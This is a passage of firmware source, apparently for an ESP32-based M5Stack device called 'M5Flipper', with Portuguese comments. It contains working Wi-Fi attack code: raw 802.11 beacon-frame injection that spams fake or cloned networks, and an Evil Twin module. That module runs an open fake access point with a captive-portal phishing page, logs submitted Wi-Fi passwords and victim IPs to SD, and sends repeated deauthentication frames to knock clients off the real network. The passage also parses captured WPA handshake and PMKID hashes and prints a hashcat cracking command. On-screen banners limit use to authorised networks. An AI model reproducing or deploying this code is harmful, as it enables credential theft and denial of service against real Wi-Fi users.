    "IOT_", "LAB-",  "TP-",   "FAST_", "Rede_"
  };
  static const char charset[] = "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789";
  int pi = esp_random() % 10;
  int pl = strlen(prefixes[pi]);
  if (pl >= maxLen - 2) pl = maxLen - 5;
  memcpy(out, prefixes[pi], pl);
  int suffixLen = 4 + (esp_random() % 5); // 4–8 chars
  if (pl + suffixLen >= maxLen) suffixLen = maxLen - pl - 1;
  for (int i = 0; i < suffixLen; i++)
    out[pl + i] = charset[esp_random() % (sizeof(charset)-1)];
  out[pl + suffixLen] = '\0';
}

// Constrói e injeta um frame Beacon 802.11
void sendBeacon(const char *ssid, const uint8_t *mac, uint8_t ch) {
  uint8_t frame[128];
  int pos = 0;

  // Frame Control (Management / Beacon = 0x80)
  frame[pos++] = 0x80; frame[pos++] = 0x00;
  // Duration
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // DA: broadcast
  memset(&frame[pos], 0xFF, 6); pos += 6;
  // SA = BSSID = mac
  memcpy(&frame[pos], mac, 6); pos += 6;
  memcpy(&frame[pos], mac, 6); pos += 6;
  // Sequence Control
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // Timestamp (8 bytes — preenchido pelo driver)
  uint64_t ts = esp_timer_get_time();
  memcpy(&frame[pos], &ts, 8); pos += 8;
  // Beacon Interval: 100 TU = 0x0064
  frame[pos++] = 0x64; frame[pos++] = 0x00;
  // Capability: ESS + Short Preamble
  frame[pos++] = 0x11; frame[pos++] = 0x04;
  // SSID IE (tag 0)
  uint8_t ssidLen = (uint8_t)strlen(ssid);
  frame[pos++] = 0x00; frame[pos++] = ssidLen;
  memcpy(&frame[pos], ssid, ssidLen); pos += ssidLen;
  // Supported Rates IE (tag 1)
  frame[pos++] = 0x01; frame[pos++] = 0x08;
  frame[pos++] = 0x82; frame[pos++] = 0x84;
  frame[pos++] = 0x8B; frame[pos++] = 0x96;
  frame[pos++] = 0x24; frame[pos++] = 0x30;
  frame[pos++] = 0x48; frame[pos++] = 0x6C;
  // DS Parameter IE (tag 3) — canal
  frame[pos++] = 0x03; frame[pos++] = 0x01;
  frame[pos++] = ch;

  esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);
}

void startBeacon(int apIdx) {
  // Configura modo
  memset(&gBeacon, 0, sizeof(gBeacon));

  if (apIdx >= 0 && apIdx < gAPCount) {
    // CLONE: usa SSID e MAC do AP seleccionado
    gBeacon.mode = BMODE_CLONE;
    gBeacon.channel = gAPs[apIdx].channel;
    strncpy(gBeacon.cloneSsid, gAPs[apIdx].ssid.isEmpty()
            ? "[Oculto]" : gAPs[apIdx].ssid.c_str(), 32);
    parseBssid(gAPs[apIdx].bssid, gBeacon.cloneMac);
    // Preenche lista[0] com o clone
    strncpy(gBeacon.ssidList[0], gBeacon.cloneSsid, 32);
    memcpy(gBeacon.macList[0], gBeacon.cloneMac, 6);
  } else {
    // RANDOM: gera primeiro SSID/MAC aleatório no canal 1
    gBeacon.mode = BMODE_RANDOM;
    gBeacon.channel = 1;
    generateRandomSSID(gBeacon.ssidList[0], 33);
    generateRandomMAC(gBeacon.macList[0]);
  }
  gBeacon.listHead  = 0;
  gBeacon.listCount = 1;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);  // necessário para 80211_tx
  esp_wifi_set_channel(gBeacon.channel, WIFI_SECOND_CHAN_NONE);

  gBeaconRunning = true;
  gBeacon.lastTx = millis();
  gBeacon.sentCount = 0;
}

void stopBeacon() {
  gBeaconRunning = false;
  esp_wifi_set_promiscuous(false);
}

// ── Ecrã de Beacon Spam ──────────────────────────────────────
void drawBeacon() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Beacon Spam");

  // Botões de controlo
  drawBtn(SCR_W-328, 8, 110, 46, gBeaconRunning ? "Parar" : "Iniciar", gBeaconRunning);
  drawBtn(SCR_W-212, 8, 94, 46, gBeacon.mode == BMODE_RANDOM ? "RANDOM" : "CLONE", false);
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  // Banner legal
  canvas.fillRect(10, 70, SCR_W-20, 36, C_DGRAY);
  canvas.setTextColor(C_WHITE); canvas.setTextSize(1);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("USE APENAS EM REDES PROPRIAS OU COM AUTORIZACAO EXPLICITA DO RESPONSAVEL",
                    SCR_W/2, 88);
  canvas.setTextDatum(TL_DATUM);

  // Linha de configuração: Canal  [<] XX [>]
  int cy = 116;
  canvas.setTextSize(2); canvas.setTextColor(C_GRAY);
  canvas.drawString("Canal:", 30, cy);
  drawBtn(200, cy-4, 52, 36, "<");
  char chBuf[4]; sprintf(chBuf, "%2d", gBeacon.channel);
  canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString(chBuf, 310, cy+14);
  canvas.setTextDatum(TL_DATUM);
  drawBtn(360, cy-4, 52, 36, ">");

  // Modo
  canvas.setTextSize(2); canvas.setTextColor(C_GRAY);
  canvas.drawString("Modo:", 480, cy);
  canvas.setTextColor(C_BLACK);
  canvas.drawString(gBeacon.mode == BMODE_RANDOM ? "Aleatorio" : "Clone AP", 630, cy);

  canvas.drawLine(10, cy+44, SCR_W-10, cy+44, C_LGRAY);

  // Estatísticas
  int sy = cy + 54;
  canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString("Enviados:", 30, sy);
  char cntBuf[20]; sprintf(cntBuf, "%lu", gBeacon.sentCount);
  canvas.setTextColor(C_BLACK); canvas.setTextSize(3); canvas.drawString(cntBuf, 220, sy-4);

  if (gBeacon.mode == BMODE_CLONE && gBeacon.cloneSsid[0]) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY);
    canvas.drawString("SSID:", 480, sy);
    canvas.setTextColor(C_BLACK);
    String cs = String(gBeacon.cloneSsid);
    if (cs.length() > 18) cs = cs.substring(0,17) + "~";
    canvas.drawString(cs, 620, sy);
  } else if (gBeacon.mode == BMODE_RANDOM) {
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString("Rotaciona SSID/MAC aleatorio a cada 30 beacons", 480, sy+8);
  }

  canvas.drawLine(10, sy+46, SCR_W-10, sy+46, C_LGRAY);

  // Histórico de SSIDs
  int hy = sy + 56;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("SSID", 22, hy);
  canvas.drawString("MAC", 450, hy);
  canvas.drawLine(10, hy+14, SCR_W-10, hy+14, C_DGRAY);
  hy += 18;

  int maxRows = min(gBeacon.listCount, 6);
  for (int r = 0; r < maxRows; r++) {
    // Mostra do mais recente para o mais antigo
    int idx = (gBeacon.listHead - r + 8) % 8;
    int ry = hy + r * 42;
    canvas.fillRect(10, ry, SCR_W-20, 40, r%2==0 ? C_WHITE : C_LGRAY);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(2);
    canvas.drawString(gBeacon.ssidList[idx], 22, ry+10);
    // MAC formatado
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             gBeacon.macList[idx][0], gBeacon.macList[idx][1],
             gBeacon.macList[idx][2], gBeacon.macList[idx][3],
             gBeacon.macList[idx][4], gBeacon.macList[idx][5]);
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString(macStr, 450, ry+14);
  }

  if (gBeacon.listCount == 0) {
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString("Toque em Iniciar para comecar.", SCR_W/2, SCR_H/2 + 60);
    canvas.setTextDatum(TL_DATUM);
  }

  // Rodapé
  canvas.setTextSize(1); canvas.setTextColor(C_GRAY);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("802.11 Beacon injection — ESP32 WIFI_IF_STA", SCR_W/2, SCR_H-16);
  canvas.setTextDatum(TL_DATUM);

  pushFast();
}

// ════════════════════════════════════════════════════════════
//  Evil Twin (AP Falso + Captive Portal)
// ════════════════════════════════════════════════════════════

// ── Salva credencial no SD ───────────────────────────────────
void saveEvilCred(int idx) {
  if (!gSdReady || !gEvilCredFile[0] || idx < 0 || idx >= gCredCount) return;
  File f = SD.open(gEvilCredFile, FILE_APPEND);
  if (!f) return;
  char ts[20]; rtcTimestamp(ts, sizeof(ts));
  f.printf("[%s] SSID=%-32s  PASS=%s  IP=%s\n",
           ts, gEvilSsid, gCreds[idx].pass, gCreds[idx].ip);
  f.close();
  snprintf(gSdMsg, sizeof(gSdMsg), "CRED #%d: %.20s", idx+1, gCreds[idx].pass);
  Serial.printf("[EvilTwin] Cred #%d  PASS=%s  IP=%s\n",
                idx+1, gCreds[idx].pass, gCreds[idx].ip);
}

// ── Handlers HTTP ────────────────────────────────────────────
static void evilHandleRoot() {
  String page = String(EVIL_HTML_LOGIN);
  page.replace("%SSID%", String(gEvilSsid));
  gWebServer.send(200, "text/html", page);
}

static void evilHandleLogin() {
  String pass = gWebServer.arg("pass");
  if (pass.length() > 0 && gCredCount < MAX_CREDS) {
    strncpy(gCreds[gCredCount].pass, pass.c_str(), 63);
    // IP do cliente
    String ip = gWebServer.client().remoteIP().toString();
    strncpy(gCreds[gCredCount].ip, ip.c_str(), 15);
    gCreds[gCredCount].when = millis();
    gCredCount++;
    saveEvilCred(gCredCount - 1);
  }
  gWebServer.send(200, "text/html", String(EVIL_HTML_OK));
}

static void evilHandleNotFound() {
  // Redireciona qualquer URL para o portal (captive portal trick)
  gWebServer.sendHeader("Location", "http://192.168.4.1/", true);
  gWebServer.send(302, "text/plain", "");
}

// ── Início e fim ─────────────────────────────────────────────
void startEvilTwin(int apIdx) {
  const char *ssid = (apIdx >= 0 && apIdx < gAPCount)
                     ? (gAPs[apIdx].ssid.isEmpty() ? "FreeWiFi" : gAPs[apIdx].ssid.c_str())
                     : "FreeWiFi";
  strncpy(gEvilSsid, ssid, 32); gEvilSsid[32] = '\0';
  gEvilChannel = (apIdx >= 0 && apIdx < gAPCount) ? gAPs[apIdx].channel : 6;

  // Configura alvo para deauth
  if (apIdx >= 0 && apIdx < gAPCount) {
    parseBssid(gAPs[apIdx].bssid, gDeauthTarget.bssid);
    strncpy(gDeauthTarget.ssid, gEvilSsid, 32);
    gDeauthTarget.channel = gEvilChannel;
    memcpy(&gDeauthFrame[10], gDeauthTarget.bssid, 6);
    memcpy(&gDeauthFrame[16], gDeauthTarget.bssid, 6);
  }

  gCredCount = 0;
  memset(gCreds, 0, sizeof(gCreds));
  gSdMsg[0] = '\0';

  // Inicia AP aberto no canal do alvo
  WiFi.mode(WIFI_AP);
  WiFi.softAP(gEvilSsid, "", gEvilChannel, 0, 4);
  delay(300);

  // DNS: redireciona * → portal
  gDnsServer.start(53, "*", WiFi.softAPIP());

  // HTTP: login + redirect
  gWebServer.on("/", HTTP_GET,  evilHandleRoot);
  gWebServer.on("/login", HTTP_POST, evilHandleLogin);
  gWebServer.onNotFound(evilHandleNotFound);
  gWebServer.begin();

  // Cria ficheiro de credenciais no SD
  gEvilCredFile[0] = '\0';
  if (gSdReady) {
    char ts[20]; rtcTimestamp(ts, sizeof(ts));
    snprintf(gEvilCredFile, sizeof(gEvilCredFile), "/creds_%s.txt", ts);
    File f = SD.open(gEvilCredFile, FILE_WRITE);
    if (f) {
      f.printf("# M5Flipper — Evil Twin Session\n");
      f.printf("# SSID: %s | Canal: %d\n", gEvilSsid, gEvilChannel);
      f.close();
    }
  }

  gEvilRunning    = true;
  gLastEvilRefresh = 0;
  gLastEvilDeauth  = 0;
  Serial.printf("[EvilTwin] AP '%s' iniciado: %s  ch%d\n",
                gEvilSsid, WiFi.softAPIP().toString().c_str(), gEvilChannel);
}

void stopEvilTwin() {
  gEvilRunning = false;
  gWebServer.stop();
  gDnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  Serial.printf("[EvilTwin] AP parado. %d credencial(is) capturada(s).\n", gCredCount);
}

// Processa pedidos DNS/HTTP — chamar no loop()
void evilTwinLoop() {
  if (!gEvilRunning) return;
  gDnsServer.processNextRequest();
  gWebServer.handleClient();
  // Deauth burst ao AP real (a cada 50ms) para forçar migração
  if (gEvilDeauth && millis() - gLastEvilDeauth >= 50) {
    esp_wifi_80211_tx(WIFI_IF_AP, gDeauthFrame, sizeof(gDeauthFrame), false);
    gLastEvilDeauth = millis();
  }
}

// ── Ecrã Evil Twin ───────────────────────────────────────────
void drawEviltwin() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Evil Twin");

  // Botões
  drawBtn(SCR_W-444, 8, 126, 46, gEvilRunning ? "Parar" : "Iniciar", gEvilRunning);
  drawBtn(SCR_W-310, 8, 124, 46, gEvilDeauth ? "Deauth ON" : "Deauth OFF", gEvilDeauth);
  drawBtn(SCR_W-178, 8,  60, 46, "Log");
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  // Banner legal (vermelho simulado com DGRAY)
  canvas.fillRect(10, 70, SCR_W-20, 36, C_DGRAY);
  canvas.setTextColor(C_WHITE); canvas.setTextSize(1); canvas.setTextDatum(MC_DATUM);
  canvas.drawString(
    "ILEGAL SEM AUTORIZACAO EXPLICITA — USO RESTRITO A TESTES EM REDES PROPRIAS",
    SCR_W/2, 88);
  canvas.setTextDatum(TL_DATUM);

  // Info do AP falso
  int y = 118;
  auto row = [&](const char *lbl, const String &val, bool big = false) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 30, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(big ? 3 : 2);
    canvas.drawString(val, 230, y - (big ? 4 : 0));
    canvas.drawLine(20, y+32+(big?4:0), SCR_W-20, y+32+(big?4:0), C_LGRAY);
    y += big ? 48 : 42;
  };

  row("SSID:",  gEvilSsid[0] ? gEvilSsid : "—", true);
  row("Canal:", String(gEvilChannel));

  if (gEvilRunning) {
    row("Portal:", WiFi.softAPIP().toString());
    uint8_t cn = WiFi.softAPgetStationNum();
    row("Clientes AP:", String(cn) + (cn==1 ? " conectado" : " conectados"));
  } else {
    row("Portal:", "http://192.168.4.1/");
    row("Estado:", "Parado — toque Iniciar");
  }

  // Secção de credenciais
  canvas.drawLine(20, y+4, SCR_W-20, y+4, C_BLACK); y += 14;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  char chdr[44]; snprintf(chdr, sizeof(chdr), "CREDENCIAIS CAPTURADAS (%d / %d)", gCredCount, MAX_CREDS);
  canvas.drawString(chdr, 30, y); y += 16;

  if (gCredCount == 0) {
    canvas.setTextSize(2); canvas.setTextColor(C_LGRAY); canvas.setTextDatum(MC_DATUM);
    canvas.drawString(gEvilRunning ? "Aguardando vitimas..." : "Nenhuma.", SCR_W/2, y+28);
    canvas.setTextDatum(TL_DATUM);
  } else {
    int maxShow = min(gCredCount, 4);
    for (int i = 0; i < maxShow; i++) {
      int ry = y + i * 50;
      bool latest = (i == gCredCount-1);
      canvas.fillRect(20, ry, SCR_W-40, 48, latest ? C_BLACK : (i%2==0 ? C_WHITE : C_LGRAY));
      canvas.setTextSize(2); canvas.setTextColor(latest ? C_WHITE : C_BLACK);
      char pw[70]; snprintf(pw, sizeof(pw), "#%d  %s", i+1, gCreds[i].pass);
      canvas.drawString(pw, 30, ry+8);
      canvas.setTextSize(1); canvas.setTextColor(latest ? C_LGRAY : C_DGRAY);
      char ipt[24]; snprintf(ipt, sizeof(ipt), "IP: %s", gCreds[i].ip[0] ? gCreds[i].ip : "?");
      canvas.drawString(ipt, 30, ry+30);
    }
    if (gCredCount > 4) {
      canvas.setTextSize(1); canvas.setTextColor(C_DGRAY); canvas.setTextDatum(MC_DATUM);
      char more[32]; snprintf(more, sizeof(more), "+%d mais — ver [Log] ou SD", gCredCount-4);
      canvas.drawString(more, SCR_W/2, y + 4*50 + 10);
      canvas.setTextDatum(TL_DATUM);
    }
    if (gSdMsg[0] && gEvilCredFile[0]) {
      canvas.setTextSize(1); canvas.setTextColor(C_DGRAY); canvas.setTextDatum(TR_DATUM);
      canvas.drawString(gSdMsg, SCR_W-20, SCR_H-18);
      canvas.setTextDatum(TL_DATUM);
    }
  }

  // Rodapé técnico
  canvas.setTextSize(1); canvas.setTextColor(C_GRAY); canvas.setTextDatum(MC_DATUM);
  canvas.drawString("802.11 Open AP  |  DNS wildcard  |  Captive Portal  |  Creds → SD",
                    SCR_W/2, SCR_H-18);
  canvas.setTextDatum(TL_DATUM);
  pushFast();
}

// ════════════════════════════════════════════════════════════
//  SD Analyzer
// ════════════════════════════════════════════════════════════

// ── Helpers ──────────────────────────────────────────────────

static FileType sdDetectType(const char *name) {
  if (strncmp(name, "wifi_",    5) == 0) return FT_WIFI_SCAN;
  if (strncmp(name, "hs_",      3) == 0) return FT_HANDSHAKE;
  if (strncmp(name, "pmkid_",   6) == 0) return FT_PMKID;
  if (strncmp(name, "clients_", 8) == 0) return FT_CLIENTS;
  if (strncmp(name, "creds_",   6) == 0) return FT_CREDS;
  return FT_OTHER;
}

// "aabbccddeeff" → "AA:BB:CC:DD:EE:FF"
static void hexToMac(const char *hex, char *out) {
  if (!hex || strlen(hex) < 12) { strcpy(out, "??:??:??:??:??:??"); return; }
  snprintf(out, 18, "%c%c:%c%c:%c%c:%c%c:%c%c:%c%c",
           toupper(hex[0]),  toupper(hex[1]),
           toupper(hex[2]),  toupper(hex[3]),
           toupper(hex[4]),  toupper(hex[5]),
           toupper(hex[6]),  toupper(hex[7]),
           toupper(hex[8]),  toupper(hex[9]),
           toupper(hex[10]), toupper(hex[11]));
}

// Pares hex → string ASCII imprimível (para SSID a partir de ESSID_HEX)
static void hexToAscii(const char *hex, char *out, int maxLen) {
  int i = 0;
  while (hex && hex[0] && hex[1] && i < maxLen-1) {
    char h[3] = {hex[0], hex[1], '\0'};
    char c = (char)strtol(h, nullptr, 16);
    out[i++] = (c >= 0x20 && c <= 0x7E) ? c : '?';
    hex += 2;
  }
  out[i] = '\0';
}

static void formatSize(uint32_t bytes, char *out) {
  if      (bytes < 1024)       snprintf(out, 12, "%lu B",    bytes);
  else if (bytes < 1048576)    snprintf(out, 12, "%.1f KB", bytes / 1024.0f);
  else                         snprintf(out, 12, "%.1f MB", bytes / 1048576.0f);
}

// Lê linhas de um ficheiro para o buffer de pré-visualização
static void sdLoadRaw(const char *path) {
  gSdPrev.lineCount = 0;
  File f = SD.open(path);
  if (!f) return;
  while (f.available() && gSdPrev.lineCount < PREV_MAX_LINES) {
    int n = 0;
    while (f.available() && n < PREV_COL_LEN-1) {
      char c = f.read();
      if (c == '\n') break;
      if (c != '\r') gSdPrev.lines[gSdPrev.lineCount][n++] = c;
    }
    gSdPrev.lines[gSdPrev.lineCount][n] = '\0';
    if (n > 0) gSdPrev.lineCount++;
  }
  f.close();
}

// Extrai campos de um ficheiro hc22000 (PMKID ou Handshake)
static bool sdParseHc22000(const char *path) {
  gSdPrev.hasParsed = false;
  gSdPrev.ssid[0] = gSdPrev.bssidStr[0] = gSdPrev.staStr[0] = '\0';
  gSdPrev.keyHex[0] = gSdPrev.hashLine[0] = '\0';
  gSdPrev.hashType[0] = '\0';

  File f = SD.open(path);
  if (!f) return false;

  char line[280];
  while (f.available()) {
    int n = 0;
    while (f.available() && n < (int)sizeof(line)-1) {
      char c = f.read();
      if (c == '\n') break;
      if (c != '\r') line[n++] = c;
    }
    line[n] = '\0';
    if (!n) continue;

    // Extrai SSID dos comentários: "# SSID : MinhRede"
    if (strncmp(line, "# SSID", 6) == 0) {
      const char *p = strchr(line, ':');
      if (p) {
        p++; while (*p == ' ') p++;
        strncpy(gSdPrev.ssid, p, 32); gSdPrev.ssid[32] = '\0';
      }
      continue;
    }

    // Linha hash: WPA*VER*KEY*BSSID*STA*ESSID_HEX*...
    if (strncmp(line, "WPA*", 4) == 0) {
      strncpy(gSdPrev.hashLine, line, 259); gSdPrev.hashLine[259] = '\0';

      char tmp[280]; strncpy(tmp, line, 279);
      char *tok = strtok(tmp, "*");          // "WPA"
      if (!tok) break;
      tok = strtok(nullptr, "*");            // "01" / "02"
      if (!tok) break;
      strncpy(gSdPrev.hashType, tok, 3); gSdPrev.hashType[3] = '\0';

      tok = strtok(nullptr, "*");            // PMKID ou MIC hex
      if (!tok) break;
      strncpy(gSdPrev.keyHex, tok, 32); gSdPrev.keyHex[32] = '\0';

      tok = strtok(nullptr, "*");            // BSSID hex (sem separadores)
      if (tok) hexToMac(tok, gSdPrev.bssidStr);

      tok = strtok(nullptr, "*");            // STA hex
      if (tok) hexToMac(tok, gSdPrev.staStr);

      tok = strtok(nullptr, "*");            // ESSID hex
      if (tok && !gSdPrev.ssid[0])
        hexToAscii(tok, gSdPrev.ssid, 33);

      gSdPrev.hasParsed = true;
      break;
    }
  }
  f.close();
  return gSdPrev.hasParsed;
}

// ── Operações de SD ──────────────────────────────────────────

void sdListFiles() {
  gSdEntryCount = 0; gSdEntrySelIdx = -1; gSdBrowserScroll = 0;
  if (!gSdReady) return;

  File root = SD.open("/");
  if (!root) return;
  File f;
  while ((f = root.openNextFile()) && gSdEntryCount < MAX_SD_FILES) {
    if (f.isDirectory()) { f.close(); continue; }
    const char *nm = f.name();
    const char *sl = strrchr(nm, '/');
    if (sl) nm = sl + 1;
    FileType ft = sdDetectType(nm);
    strncpy(gSdEntries[gSdEntryCount].name, nm, 35);
    gSdEntries[gSdEntryCount].name[35] = '\0';
    gSdEntries[gSdEntryCount].size  = f.size();
    gSdEntries[gSdEntryCount].ftype = ft;
    gSdEntryCount++;
    f.close();
  }
  root.close();

  // Ordena por nome descendente (timestamp = mais recente primeiro)
  for (int i = 0; i < gSdEntryCount-1; i++)
    for (int j = 0; j < gSdEntryCount-i-1; j++)
      if (strcmp(gSdEntries[j].name, gSdEntries[j+1].name) < 0) {
        SdFileEntry t = gSdEntries[j]; gSdEntries[j] = gSdEntries[j+1]; gSdEntries[j+1] = t;
      }
}

// Abre e analisa o ficheiro seleccionado
void sdOpenPreview(int idx) {
  if (idx < 0 || idx >= gSdEntryCount) return;
  SdFileEntry &e = gSdEntries[idx];
  memset(&gSdPrev, 0, sizeof(gSdPrev));
  gSdPreviewScroll = 0;
  strncpy(gSdPrev.filename, e.name, 35);
  gSdPrev.ftype = e.ftype;

  char path[42]; snprintf(path, sizeof(path), "/%s", e.name);

  // Lê linhas brutas (para CSV e fallback)
  sdLoadRaw(path);

  if (e.ftype == FT_HANDSHAKE || e.ftype == FT_PMKID) {
    sdParseHc22000(path);
  }

  // Estatísticas para WiFi Scan
  if (e.ftype == FT_WIFI_SCAN) {
    gSdPrev.scanCount = max(0, gSdPrev.lineCount - 1); // exclui cabeçalho
    gSdPrev.bestRssi  = -200;
    for (int i = 1; i < gSdPrev.lineCount; i++) {
      // RSSI é o último campo CSV: "ssid",bssid,ch,auth,rssi
      const char *p = strrchr(gSdPrev.lines[i], ',');
      if (!p) continue;
      int rssi = atoi(p + 1);
      if (rssi > gSdPrev.bestRssi) {
        gSdPrev.bestRssi = rssi;
        // SSID é o 1º campo (pode ter aspas)
        const char *q = gSdPrev.lines[i];
        if (*q == '"') q++;
        const char *end = strchr(q, '"');
        int len = end ? (int)(end-q) : (int)strcspn(q, ",");
        len = min(len, 32);
        memcpy(gSdPrev.bestSsid, q, len); gSdPrev.bestSsid[len] = '\0';
      }
    }
  }
}

void sdDeleteSelected() {
  if (gSdEntrySelIdx < 0 || gSdEntrySelIdx >= gSdEntryCount) return;
  char path[42]; snprintf(path, sizeof(path), "/%s", gSdEntries[gSdEntrySelIdx].name);
  SD.remove(path);
  Serial.printf("[SD] Apagado: %s\n", path);
  sdListFiles();
}

// Envia o hash hc22000 para o Serial (copiar para PC → hashcat)
void sdDumpHashToSerial() {
  if (!gSdPrev.hashLine[0]) { Serial.println("[SD] Nenhum hash carregado."); return; }
  Serial.println("\n====== M5Flipper — Hash hc22000 ======");
  if (gSdPrev.ssid[0])     Serial.printf("SSID   : %s\n", gSdPrev.ssid);
  if (gSdPrev.bssidStr[0]) Serial.printf("BSSID  : %s\n", gSdPrev.bssidStr);
  if (gSdPrev.staStr[0])   Serial.printf("STA    : %s\n", gSdPrev.staStr);
  Serial.printf("Tipo   : WPA*%s* (%s)\n",
                gSdPrev.hashType,
                strcmp(gSdPrev.hashType,"01")==0 ? "PMKID" : "Handshake");
  Serial.println("Hash:");
  Serial.println(gSdPrev.hashLine);
  Serial.printf("hashcat -m 22000 %s wordlist.txt\n", gSdPrev.filename);
  Serial.println("=======================================\n");
}

// ── Ecrã: Browser de Ficheiros ───────────────────────────────

void drawSdBrowser() {
  canvas.fillSprite(C_WHITE);
  drawHeader("SD Analise");
  drawBtn(SCR_W-220, 8, 102, 46, "Refresh");
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  if (!gSdReady) {
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString("Cartao SD nao encontrado.", SCR_W/2, SCR_H/2-20);
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString("Verifique o cartao e reinicie.", SCR_W/2, SCR_H/2+18);
    canvas.setTextDatum(TL_DATUM); pushQuality(); return;
  }

  char st[52];
  snprintf(st, sizeof(st), "%d arquivo(s)  |  SD pronto", gSdEntryCount);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString(st, 18, LIST_TOP-18);
  canvas.drawLine(10, LIST_TOP-4, SCR_W-16, LIST_TOP-4, C_BLACK);

  if (gSdEntryCount == 0) {
    canvas.setTextSize(2); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(C_BLACK);
    canvas.drawString("Nenhum arquivo M5Flipper encontrado.", SCR_W/2, SCR_H/2+20);
    canvas.setTextDatum(TL_DATUM); pushQuality(); return;
  }

  // Cabeçalho da tabela
  int hy = LIST_TOP + 2;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("NOME",          22, hy);
  canvas.drawString("TIPO",         500, hy);
  canvas.drawString("TAMANHO",      690, hy);
  canvas.drawLine(10, hy+14, SCR_W-16, hy+14, C_DGRAY);

  int tableTop = hy + 18;
  int tROW_H   = 50;
  int visRows  = 7;

  for (int i = 0; i < visRows; i++) {
    int idx = gSdBrowserScroll + i; if (idx >= gSdEntryCount) break;
    SdFileEntry &e = gSdEntries[idx];
    bool sel = (idx == gSdEntrySelIdx);
    int ry = tableTop + i * tROW_H;
    canvas.fillRect(10, ry, SCR_W-26, tROW_H-2,
                    sel ? C_BLACK : (i%2==0 ? C_WHITE : C_LGRAY));
    canvas.setTextColor(sel ? C_WHITE : C_BLACK);

    // Nome (truncado)
    char nm[32]; strncpy(nm, e.name, 31); nm[31] = '\0';
    if (strlen(e.name) > 31) { nm[28]='.'; nm[29]='.'; nm[30]='\0'; }
    canvas.setTextSize(2); canvas.drawString(nm, 22, ry+14);

    // Badge de tipo
    uint16_t badgeCol = (e.ftype==FT_HANDSHAKE||e.ftype==FT_PMKID) ? C_DGRAY : C_LGRAY;
    canvas.fillRect(494, ry+9, 168, 30, sel ? C_DGRAY : badgeCol);
    canvas.setTextSize(1);
    bool darkBadge = (e.ftype==FT_HANDSHAKE||e.ftype==FT_PMKID||sel);
    canvas.setTextColor(darkBadge ? C_WHITE : C_BLACK);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString(FT_LABELS[e.ftype], 578, ry+24);
    canvas.setTextDatum(TL_DATUM);

    // Tamanho
    char sz[14]; formatSize(e.size, sz);
    canvas.setTextSize(1); canvas.setTextColor(sel ? C_WHITE : C_DGRAY);
    canvas.drawString(sz, 690, ry+18);
  }

  // Scrollbar
  int sbH = visRows * tROW_H;
  canvas.drawRect(SCR_W-12, tableTop, 4, sbH, C_LGRAY);
  if (gSdEntryCount > visRows) {
    int th  = sbH * visRows / gSdEntryCount;
    int thy = tableTop + sbH * gSdBrowserScroll / gSdEntryCount;
    canvas.fillRect(SCR_W-12, thy, 4, max(th, 12), C_BLACK);
  }

  // Footer
  int footY = SCR_H - 44;
  char pg[28];
  sprintf(pg, "%d de %d", min(gSdBrowserScroll+visRows, gSdEntryCount), gSdEntryCount);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.setTextDatum(MC_DATUM); canvas.drawString(pg, 330, footY+20);
  canvas.setTextDatum(TL_DATUM);
  if (gSdBrowserScroll > 0)                      drawBtn(10,  footY, 130, 38, "^ Anterior");
  if (gSdBrowserScroll+visRows < gSdEntryCount)  drawBtn(150, footY, 130, 38, "v Proximo");
  if (gSdEntrySelIdx >= 0) {
    drawBtn(570, footY, 160, 38, "Abrir");
    drawBtn(738, footY, 164, 38, "Apagar");
  }
  pushQuality();
}

// ── Ecrã: Pré-visualização / Análise de Ficheiro ─────────────

void drawSdPreview() {
  canvas.fillSprite(C_WHITE);

  // Título abreviado
  char hdr[52] = "SD: ";
  strncat(hdr, gSdPrev.filename, 34);
  drawHeader(hdr);

  bool isHash = (gSdPrev.ftype == FT_HANDSHAKE || gSdPrev.ftype == FT_PMKID);
  if (isHash) drawBtn(SCR_W-332, 8, 114, 46, ">> Serial");
  drawBtn(SCR_W-210, 8,  92, 46, "Apagar");
  drawBtn(SCR_W-110, 8, 102, 46, "Voltar");

  int y = 78;

  // ── hc22000 — visão estruturada ──────────────────────────
  if (isHash && gSdPrev.hasParsed) {
    bool isPmkid = (gSdPrev.ftype == FT_PMKID);

    // Badge de tipo
    canvas.fillRect(10, y, SCR_W-20, 36, C_BLACK);
    canvas.setTextSize(2); canvas.setTextColor(C_WHITE); canvas.setTextDatum(MC_DATUM);
    char badge[48];
    snprintf(badge, sizeof(badge), isPmkid
             ? "PMKID  WPA*01*  hashcat -m 22000"
